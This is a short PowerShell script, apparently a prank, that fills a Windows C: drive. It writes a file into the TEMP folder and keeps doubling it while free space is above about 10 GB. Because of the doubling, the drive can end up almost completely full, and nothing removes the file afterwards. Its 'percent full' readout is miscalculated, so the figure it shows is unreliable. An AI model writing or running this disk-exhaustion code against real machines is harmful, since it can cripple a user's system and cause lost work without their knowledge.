#Massive file creator - Because I can

$on = Get-PSDrive C | Select-Object Free
$off = 10000000000

function Get-Got {

$file = "$env:TEMP\1f507433UR-420-69MOM-9c7e-b84c6d28c525.txt"

    if (-not(Test-Path -Path "$file")) {
    
        New-Item -Path "$file" -ItemType File -Value "01100100 01100001 01100010"
        Get-Got
        
    } else {
    
        while ($on.Free -gt $off) {
         
            $from = Get-Content -Path $file
            Add-Content -Path "$file" -Value $from -PassThru
            $on = Get-PSDrive C | Select-Object Free
            $fraction = $off/$on.Free
            if ($fraction -gt 1) {
                $fraction = 1
            }
            $percentage = [math]::floor($fraction*100)
            Clear-Host
            Write-Host "C: Drive is $percentage% full"
    
        }
    
    }

}

Get-Got